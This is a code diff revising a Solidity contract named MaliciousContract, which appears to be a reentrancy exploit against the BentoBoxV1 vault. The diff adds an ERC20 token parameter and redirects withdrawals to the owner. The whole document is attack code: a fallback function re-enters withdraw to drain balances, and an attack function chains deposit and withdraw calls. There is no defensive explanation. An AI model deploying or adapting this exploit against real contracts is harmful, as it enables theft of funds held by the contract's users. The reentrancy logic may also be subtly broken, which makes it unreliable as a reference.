@@ -2,19 +2,22 @@
 pragma solidity ^0.6.12;
 
 import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract
-// No need to import IERC20 again, since it's already defined in BentoBoxV1
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; // Import ERC20 interface
 
 contract MaliciousContract {
     address public owner;
     BentoBoxV1 public targetContract;
+    IERC20 public token; // Declare token variable
 
     event AttackExecuted(uint256 amount);
     event WithdrawExecuted(uint256 amount);
     event BalanceBeforeAttack(uint256 balance);
 
-    constructor(address payable _targetContract) public {
+    constructor(address payable _targetContract, address _token) public {
+        require(_token != address(0), "Token address cannot be zero");
         owner = msg.sender;
         targetContract = BentoBoxV1(_targetContract);
+        token = IERC20(_token); // Initialize token with the correct address
     }
 
     // Explicitly add a receive function to handle incoming Ether
@@ -22,9 +25,11 @@ contract MaliciousContract {
 
     fallback() external payable {
         // Triggering reentrancy by calling withdraw again if there are available funds
-        uint256 balance = targetContract.balanceOf(IERC20(address(0)), address(this)); // Using address(0) for ETH, adjust for specific token if needed
+        uint256 balance = targetContract.balanceOf(token, address(this)); // Use the actual token address
         if (balance > 0) {
-            targetContract.withdraw(IERC20(address(0)), address(this), address(this), balance, 0); // Withdraw to this contract
+            // Log the balance before attempting to withdraw
+            emit BalanceBeforeAttack(balance);
+            targetContract.withdraw(token, address(this), owner, balance, 0);
         }
     }
 
@@ -32,20 +37,15 @@ contract MaliciousContract {
         require(msg.sender == owner, "Not the owner");
 
         // Check balance before attack
-        uint256 beforeBalance = targetContract.balanceOf(IERC20(address(0)), address(this)); // Using address(0) for ETH or adjust for actual token
+        uint256 beforeBalance = targetContract.balanceOf(token, address(this)); // Use the actual token address
         emit BalanceBeforeAttack(beforeBalance);
 
         // Execute deposit to trigger the fallback function
-        targetContract.deposit(IERC20(address(0)), address(this), owner, beforeBalance, 0);
+        targetContract.deposit(token, address(this), owner, beforeBalance, 0);
 
         // Now withdraw to trigger reentrancy
-        targetContract.withdraw(IERC20(address(0)), address(this), address(this), beforeBalance, 0);
+        targetContract.withdraw(token, address(this), owner, beforeBalance, 0);
 
-        // Send the withdrawn amount to the owner's address
-        uint256 withdrawAmount = address(this).balance; // Get the current balance of this contract
-        (bool success, ) = owner.call{value: withdrawAmount}(""); // Send the balance to the owner
-        require(success, "Transfer failed");
-
-        emit AttackExecuted(withdrawAmount);
+        emit AttackExecuted(beforeBalance);
     }
 }
